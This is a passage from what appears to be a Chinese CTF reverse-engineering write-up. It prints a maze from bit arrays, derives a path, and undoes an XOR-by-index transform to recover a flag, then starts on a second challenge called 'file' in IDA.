class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,]</span><br><span class="line">l=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,]</span><br><span class="line">r=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,]</span><br><span class="line">u=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">311</span>):</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">26</span>==<span class="number">0</span>):</span><br><span class="line">        print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(d[i]):</span><br><span class="line">        print(<span class="string">&quot;d&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27; &#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(l[i]):</span><br><span class="line">        print(<span class="string">&quot;l&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot; &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(r[i]):</span><br><span class="line">        print(<span class="string">&quot;r&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot; &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(u[i]):</span><br><span class="line">        print(<span class="string">&quot;u&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot; &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;|&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>地图如下：</p>
<p><img src="https://s2.ax1x.com/2019/07/27/eMXFAI.png"></p>
<p>其中u,d,l,r分别代表在此坐标往上，下，左，右可行，地图很简单就可以找到一条路：</p>
<p><img src="https://s2.ax1x.com/2019/07/28/eMjtit.png"></p>
<p>照着路线逆向出字符串<code>&quot;06360836063b0839173e0639&quot;</code>交上去不对，回头看之前那个奇怪的加密函数：</p>
<p><img src="https://s2.ax1x.com/2019/07/28/eMvAl8.png"></p>
<p>这个函数里面看起来很丑，不好分析，用ollydbg动态调试发现就是个遍历字符串每个字符异或下标<code>i</code>,此处我的输入样例为<code>&#39;0&#39;*24</code>   </p>
<p>第17位异或1：<br><img src="https://s2.ax1x.com/2019/07/28/eMvsXD.png"></p>
<p>异或下标：<br><img src="https://s2.ax1x.com/2019/07/28/eMv6ne.png"></p>
<p>脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = list(<span class="string">&quot;06360836063b0839073e0639&quot;</span>)</span><br><span class="line">a[<span class="number">16</span>] = chr(ord(a[<span class="number">16</span>]) ^ <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    print(chr(ord(a[i])^i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#07154=518?9i&lt;5=6!&amp;!v$#%.</span></span><br></pre></td></tr></table></figure>
<p>得到flag。</p>
<h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><p>IDA先看main函数：</p>
<p><img src="https://s2.ax1x.com/2019/07/28/e1Sxjx.png"></p>
<p>有个<code>flllag</code>像flag但是交上去不对，在这里只是一个字符串，用于判断，程序先读取文件内容(此处文件缺失)，然后与现有的数据进行异或比较判断文件正确与否，文件md5就是flag，<code>flllag</code>和<code>sttr_home</code>都能跟进找到，只需再分析<code>sub_400EB9</code>函数对<code>sttr_home</code>的加密,跟进：</p>
<p><img src="https://s2.ax1x.com/2019/07/28/e1prG9.png"></p>
<p>用同一个函数处理两个参数再加起来，再跟进这个函数:</p>
